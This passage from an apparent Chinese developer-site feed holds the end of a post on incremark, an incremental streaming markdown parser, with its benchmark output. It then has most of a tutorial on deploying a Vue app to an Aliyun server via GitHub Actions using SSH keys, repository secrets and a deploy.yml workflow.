<p>然后就出现了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-docs.vercel.app%2F" target="_blank" title="https://incremark-docs.vercel.app/" ref="nofollow noopener noreferrer">incremark</a>，在此过程中也关注到了 <code>vue-stream-markdown</code>，不过它做的只是 vue 渲染层的优化，每次 ai 输出的 markdown chunk，它还是会将其跟之前所有输出拼接解析成 token，虽然在渲染层做到了流式的渲染，但其内核无法满足我的需求。</p>
<h2 data-id="heading-1">想法的实现</h2>
<p>在选择 markdown 底层解析器的时候关注了 tiptap 在用的 markedjs 以及之前自己实现 tiptap markdown 转换的 markdown-it，但最终还是选择了 remark 底层编辑器 micromark。因为 markdown-it token 结构的复杂度远高于 mdast 结构，它存在进入、退出的概念，但 mdast 就是一棵树。</p>
<p>因此拼接一棵树的复杂度其实是更低的，整个工具的设计思路为：</p>
<ol>
<li>维护一个文本缓冲区，接收流式输入</li>
<li>识别"稳定边界"（如空行、标题等），将已完成的块标记为 completed</li>
<li>对于正在接收的块，每次重新解析，但只解析该块的内容</li>
<li>复杂嵌套节点（如列表、引用）作为整体处理，直到确认完成</li>
</ol>
<p>最终可以将流式 markdown 的解析复杂度从 O(n²) 降低到 O(n)，ai 输出内容越多，性能节省也越多。</p>
<h2 data-id="heading-2">实际 benchmark 测试</h2>
<p>小型 markdown 解析性能可提高 2-10 倍，中型 markdown 解析性能提高 10-20 倍，长 markdown 解析性能提高 20-46 倍，当前更长的测试是没有必要的。</p>
<p>原始测试输出结果：</p>
<pre><code class="hljs language-plain" lang="plain">============================================================
Incremark Benchmark
============================================================
Markdown length: 771 chars
Chunk size: 10 chars
Total chunks: 78
Iterations: 100
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 2608.41 ms
   Parse count: 7800
   Avg time per parse: 0.3344 ms
   Total chars parsed: 3,080,100

⚡ Incremark (incremental)
   Total time: 638.36 ms
   Parse count: 7800
   Avg time per parse: 0.0818 ms
   Total chars parsed: 77,100

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 75.5%
   Chars parsing saved: 97.5%
   Speedup: 4.09x faster

============================================================

🔬 Running Incremark Benchmark Suite


============================================================
📄 Document Size: Short (~1KB) (1000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 1000 chars
Chunk size: 10 chars
Total chunks: 100
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 435.85 ms
   Parse count: 2000
   Avg time per parse: 0.2179 ms
   Total chars parsed: 1,010,000

⚡ Incremark (incremental)
   Total time: 171.50 ms
   Parse count: 2000
   Avg time per parse: 0.0858 ms
   Total chars parsed: 20,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 60.7%
   Chars parsing saved: 98.0%
   Speedup: 2.54x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 1000 chars
Chunk size: 50 chars
Total chunks: 20
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 92.33 ms
   Parse count: 400
   Avg time per parse: 0.2308 ms
   Total chars parsed: 210,000

⚡ Incremark (incremental)
   Total time: 43.77 ms
   Parse count: 400
   Avg time per parse: 0.1094 ms
   Total chars parsed: 20,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 52.6%
   Chars parsing saved: 90.5%
   Speedup: 2.11x faster

============================================================

============================================================
📄 Document Size: Medium (~5KB) (5000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 5000 chars
Chunk size: 10 chars
Total chunks: 500
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 10335.94 ms
   Parse count: 10000
   Avg time per parse: 1.0336 ms
   Total chars parsed: 25,050,000

⚡ Incremark (incremental)
   Total time: 916.48 ms
   Parse count: 10000
   Avg time per parse: 0.0916 ms
   Total chars parsed: 100,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 91.1%
   Chars parsing saved: 99.6%
   Speedup: 11.28x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 5000 chars
Chunk size: 50 chars
Total chunks: 100
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 2120.47 ms
   Parse count: 2000
   Avg time per parse: 1.0602 ms
   Total chars parsed: 5,050,000

⚡ Incremark (incremental)
   Total time: 223.64 ms
   Parse count: 2000
   Avg time per parse: 0.1118 ms
   Total chars parsed: 100,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 89.5%
   Chars parsing saved: 98.0%
   Speedup: 9.48x faster

============================================================

============================================================
📄 Document Size: Long (~10KB) (10000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 10000 chars
Chunk size: 10 chars
Total chunks: 1000
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 40596.85 ms
   Parse count: 20000
   Avg time per parse: 2.0298 ms
   Total chars parsed: 100,100,000

⚡ Incremark (incremental)
   Total time: 1781.89 ms
   Parse count: 20000
   Avg time per parse: 0.0891 ms
   Total chars parsed: 200,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 95.6%
   Chars parsing saved: 99.8%
   Speedup: 22.78x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 10000 chars
Chunk size: 50 chars
Total chunks: 200
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 8095.40 ms
   Parse count: 4000
   Avg time per parse: 2.0239 ms
   Total chars parsed: 20,100,000

⚡ Incremark (incremental)
   Total time: 473.23 ms
   Parse count: 4000
   Avg time per parse: 0.1183 ms
   Total chars parsed: 200,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 94.2%
   Chars parsing saved: 99.0%
   Speedup: 17.11x faster

============================================================

============================================================
📄 Document Size: Very Long (~20KB) (20000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 20000 chars
Chunk size: 10 chars
Total chunks: 2000
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 183844.78 ms
   Parse count: 40000
   Avg time per parse: 4.5961 ms
   Total chars parsed: 400,200,000

⚡ Incremark (incremental)
   Total time: 3997.77 ms
   Parse count: 40000
   Avg time per parse: 0.0999 ms
   Total chars parsed: 400,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 97.8%
   Chars parsing saved: 99.9%
   Speedup: 45.99x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 20000 chars
Chunk size: 50 chars
Total chunks: 400
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 37400.52 ms
   Parse count: 8000
   Avg time per parse: 4.6751 ms
   Total chars parsed: 80,200,000

⚡ Incremark (incremental)
   Total time: 1001.10 ms
   Parse count: 8000
   Avg time per parse: 0.1251 ms
   Total chars parsed: 400,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 97.3%
   Chars parsing saved: 99.5%
   Speedup: 37.36x faster

============================================================


================================================================================
📈 Complete Benchmark Summary
================================================================================

| Document Size    | Chunk | Time Saved | Chars Saved | Speedup |
|------------------|-------|------------|-------------|---------|
| Short (~1KB)     | 10    |      60.7% |       98.0% |   2.54x |
| Short (~1KB)     | 50    |      52.6% |       90.5% |   2.11x |
| Medium (~5KB)    | 10    |      91.1% |       99.6% |  11.28x |
| Medium (~5KB)    | 50    |      89.5% |       98.0% |   9.48x |
| Long (~10KB)     | 10    |      95.6% |       99.8% |  22.78x |
| Long (~10KB)     | 50    |      94.2% |       99.0% |  17.11x |
| Very Long (~20KB) | 10    |      97.8% |       99.9% |  45.99x |
| Very Long (~20KB) | 50    |      97.3% |       99.5% |  37.36x |

--------------------------------------------------------------------------------

📊 Average by Document Size:

   Short (~1KB): 2.33x faster, 56.7% time saved
   Medium (~5KB): 10.38x faster, 90.3% time saved
   Long (~10KB): 19.94x faster, 94.9% time saved
   Very Long (~20KB): 41.67x faster, 97.5% time saved

--------------------------------------------------------------------------------

🎯 Overall Average:
   Time Saved: 84.8%
   Chars Saved: 98.0%
   Speedup: 18.58x

================================================================================
</code></pre>
<h2 data-id="heading-3">框架支持</h2>
<p>由于从解析层面上实现了流式解析，并使用 mdast 进行解析结果的记录，因此当前工具很容易迁移到各种框架中，目前实现了 vue 与 react 版本，svelte 与 solid 等小众框架实现也很简单（但暂未做）。
vue demo 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-vue.vercel.app%2F" target="_blank" title="https://incremark-vue.vercel.app/" ref="nofollow noopener noreferrer">incremark-vue.vercel.app/</a>
react demo 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-react.vercel.app%2F" target="_blank" title="https://incremark-react.vercel.app/" ref="nofollow noopener noreferrer">incremark-react.vercel.app/</a></p>
<h2 data-id="heading-4">devtools</h2>
<p>除了功能实现，还增加了 devtools 可以查看当前解析内容的一些状态</p>
<p><strong>markdown 内容统计</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/550853d582b04d6a90a110942dd29153~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=FRy5uZPWQlKoR3DBkniTVayMfmA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>markdown 块统计</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/561b83774eee4072b67cdc23a5d6a4d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=zFAmmBy2rh3%2BAAyCcXTRMnbZczA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>mdast 结果</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1be72d53785c47cead1a25813b4ba41c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=EXLNo1qZUBsL1v4vWRfz2TpOgVM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>chunk append 记录</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f478452aa88f4965b35bca6e59eaabea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=AGkL2OutYLcw%2FvlpE7UKXbRKLh8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">deepwiki 解析性能提升原因</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/237e2492d01243e8b542a83f3c5ba054~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=X93lm6rRBGjpojEYbL9ojhVWaBE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">小结</h2>
<p>欢迎大家体验，文档地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-docs.vercel.app%2Fzh%2F" target="_blank" title="https://incremark-docs.vercel.app/zh/" ref="nofollow noopener noreferrer">incremark-docs.vercel.app/zh/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全栈系列(15)github Actions自动化部署前端vue]]></title>    <link>https://juejin.cn/post/7583992239103180852</link>    <guid>https://juejin.cn/post/7583992239103180852</guid>    <pubDate>2025-12-16T06:13:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103180852" data-draft-id="7583992239103000628" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全栈系列(15)github Actions自动化部署前端vue "/> <meta itemprop="keywords" content="前端,GitHub,Node.js"/> <meta itemprop="datePublished" content="2025-12-16T06:13:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小胖霞"/> <meta itemprop="url" content="https://juejin.cn/user/3790771822016301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全栈系列(15)github Actions自动化部署前端vue 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3790771822016301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小胖霞
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:13:08.000Z" title="Tue Dec 16 2025 06:13:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多国内开发者都会采用  <strong>“Gitee 做代码托管（速度快），GitHub 做自动化构建（功能强）”</strong>  的双仓库策略。</p>
<p>你不需“手动复制文件”，只需要利用 Git 的 <strong>多远程仓库（Multiple Remotes）</strong>  功能，就能在一个本地项目中同时管理两个仓库。</p>
<p>以下是实现这一方案的最佳实践步骤：</p>
<h4 data-id="heading-0">第一步：在 GitHub 上新建仓库</h4>
<ol>
<li>登录 GitHub，创建一个空仓库（假设叫 vue-admin-deploy）。</li>
<li><strong>不要</strong>勾选“Initialize this repository with a README”，我们需要一个纯空的仓库。</li>
</ol>
<h4 data-id="heading-1">第二步：添加 GitHub 为第二个远程仓库</h4>
<p>打开你的本地项目终端，执行以下命令：</p>
<pre><code class="hljs language-js" lang="js"># <span class="hljs-number">1.</span> 查看当前的远程仓库（应该只有 gitee）
git remote -v
# 输出通常是：origin  <span class="hljs-attr">https</span>:<span class="hljs-comment">//gitee.com/你的用户名/项目名.git (fetch/push)</span>

# <span class="hljs-number">2.</span> 添加 <span class="hljs-title class_">GitHub</span> 为第二个远程仓库，命名为 <span class="hljs-string">"github"</span>
git remote add github <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/你的用户名/vue-admin-deploy.git</span>

# <span class="hljs-number">3.</span> 再次查看
git remote -v
# 现在应该有 origin (<span class="hljs-title class_">Gitee</span>) 和 github (<span class="hljs-title class_">GitHub</span>) 两个了


</code></pre>
<h4 data-id="heading-2">生成私钥和公钥</h4>
<p>请完全照做一遍，不要跳过任何步骤：</p>
<h5 data-id="heading-3">第一步：在本地电脑生成新密钥（PEM格式）</h5>
<p>打开你的终端（Git Bash 或 CMD），执行这条命令生成一对新钥匙：</p>
<pre><code class="hljs language-js" lang="js"># -m <span class="hljs-variable constant_">PEM</span> 是关键！强制生成旧版兼容格式，防止 <span class="hljs-title class_">Action</span> 不识别
# -f gh_action_key 指定文件名
# -N <span class="hljs-string">""</span> 设置空密码（必须为空）
ssh-keygen -t rsa -b <span class="hljs-number">4096</span> -m <span class="hljs-variable constant_">PEM</span> -f gh_action_key -N <span class="hljs-string">""</span>
</code></pre>
<p>执行后，你的当前目录下会有两个文件：</p>
<ol>
<li>gh_action_key (私钥，没后缀)</li>
<li>gh_action_key.pub (公钥)</li>
</ol>
<h5 data-id="heading-4">第二步：把公钥放到阿里云服务器</h5>
<ol>
<li><strong>复制公钥内容</strong>：打开 gh_action_key.pub，复制里面的全部内容。</li>
<li><strong>登录服务器</strong>：使用 SSH 登录你的阿里云服务器。</li>
<li>写入文件：执行以下命令（假设你是用 root 用户部署，如果是其他用户，请切换到对应用户）</li>
<li/>
</ol>
<pre><code class="hljs language-js" lang="js"># 进入 ssh 目录
cd ~/.<span class="hljs-property">ssh</span>

# 把公钥追加到授权文件中（注意是 &gt;&gt; 也就是追加）
# 按 i 进入编辑模式，粘贴内容，按 <span class="hljs-title class_">Esc</span>，输入 :wq 保存
vi authorized_keys
# 或者直接用命令追加（把下面双引号里的内容换成你刚才复制的公钥）
echo <span class="hljs-string">"ssh-rsa AAAAB3NzaC1yc2E..."</span> &gt;&gt; authorized_keys
</code></pre>
<p><strong>修复权限（至关重要！！！）</strong><br/>
权限不对，SSH 会直接拒绝登录，不管密钥对不对。请在服务器执行</p>
<pre><code class="hljs language-js" lang="js">chmod <span class="hljs-number">700</span> ~/.<span class="hljs-property">ssh</span>
chmod <span class="hljs-number">600</span> ~<span class="hljs-regexp">/.ssh/</span>authorized_keys
</code></pre>
<h5 data-id="heading-5">第三步：把私钥放到 GitHub Secrets</h5>
<h4 data-id="heading-6">密钥准备 (Secrets)</h4>
<p>为了安全，不要将服务器 IP 和私钥明文写在代码里。在 GitHub 仓库的 <strong>Settings -&gt; Secrets and variables -&gt; Actions</strong> 中添加：</p>
<ul>
<li>SERVER_IP: 服务器公网 IP。</li>
<li>SERVER_USER: 登录用户名 (如 root)。</li>
<li>SERVER_SSH_KEY: SSH 私钥。</li>
</ul>
<ol>
<li>
<p><strong>复制私钥内容</strong>：在本地打开 gh_action_key（那个没后缀的文件）。</p>
</li>
<li>
<p><strong>全选复制</strong>：必须包含 <code>-----BEGIN RSA PRIVATE KEY----- 和 -----END RSA PRIVATE KEY-----</code>。</p>
</li>
<li>
<p><strong>去 GitHub</strong>：<code>Settings -&gt; Secrets and variables -&gt; Actions</code>。</p>
</li>
<li>
<p><strong>更新 Secret</strong>： 去 GitHub 仓库页面 -&gt; <strong>Settings</strong> -&gt; <strong>Secrets and variables</strong> -&gt; <strong>Actions</strong>。</p>
</li>
<li>
<p>添加 SERVER_IP, SERVER_USER, SERVER_SSH_KEY。</p>
</li>
<li>
<p>SERVER_IP: 服务器公网IP，SERVER_USER：root,SERVER_SSH_KEY:上面生成的私钥</p>
</li>
</ol>
<h4 data-id="heading-7">配置 GitHub Actions</h4>
<ol>
<li>在项目根目录下，新建文件夹 .github/workflows/（注意是 .github 不是 .gitee）。</li>
<li>新建文件 deploy.yml。</li>
</ol>
<p>注意<code>node</code>版本 和使用的<code>npm</code>还是<code>pnpm</code>,  <code>yml</code>会不一样,我使用的是pnpm。以及你的前端项目是放到服务器哪个目录下的，我的是放到<code>/var/www/html/vue-admin-template/</code>,请改成你自己的服务器目录</p>
<p>文件deploy.yml</p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Aliyun</span> <span class="hljs-string">(PNPM)</span>
<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span>

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build-and-deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>

      <span class="hljs-comment"># 1. 核心新增：安装 PNPM</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">pnpm</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v2</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">version:</span> <span class="hljs-number">9</span> <span class="hljs-comment"># 这里建议写你本地使用的 pnpm 大版本 (如 8 或 9)</span>

      <span class="hljs-comment"># 2. 修改：设置 Node 并开启 pnpm 缓存</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Node.js</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">node-version:</span> <span class="hljs-string">'22.13.0'</span> <span class="hljs-comment"># &lt;--- 关键修改：设置 Node.js 版本</span>
          <span class="hljs-attr">cache:</span> <span class="hljs-string">'pnpm'</span> <span class="hljs-comment"># &lt;--- 关键修改：告诉它去找 pnpm-lock.yaml</span>

      <span class="hljs-comment"># 3. 修改：使用 pnpm 命令安装和打包</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">&amp;</span> <span class="hljs-string">Build</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">|
          node -v
          pnpm -v
          pnpm install --frozen-lockfile # 类似 npm ci，严格按照 lock 文件安装
          pnpm run build
          ls -la dist/
</span>
      <span class="hljs-comment"># 4. 上传文件 (保持不变)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Server</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">appleboy/scp-action@master</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">host:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_IP</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">username:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">key:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">source:</span> <span class="hljs-string">'dist/*'</span>
          <span class="hljs-attr">target:</span> <span class="hljs-string">'/var/www/html/vue-admin-template/'</span>
          <span class="hljs-attr">strip_components:</span> <span class="hljs-number">1</span>

      <span class="hljs-comment"># 5. 重启 Nginx (保持不变)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Restart</span> <span class="hljs-string">Nginx</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">appleboy/ssh-action@master</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">host:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_IP</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">username:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">key:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">script:</span> <span class="hljs-string">|
            sudo chown -R www-data:www-data /var/www/html/vue-admin-template/
            sudo chmod -R 755 /var/www/html/vue-admin-template/
            echo "部署完成！"
</span>
</code></pre>
<h4 data-id="heading-8">同步推送代码</h4>
<p>以后写完代码，你需要推送到两个地方。</p>
<p><strong>方式一：分别推送（清晰明了）</strong></p>
<pre><code class="hljs language-js" lang="js"># 先推送到 <span class="hljs-title class_">Gitee</span>（日常保存）
git push origin master

# 再推送到 <span class="hljs-title class_">GitHub</span>（触发部署）
git push github master
</code></pre>
<p><strong>方式二：一条命令推送到两个仓库（懒人推荐）</strong><br/>
你可以修改 git 配置，让 origin 同时指向两个地址：</p>
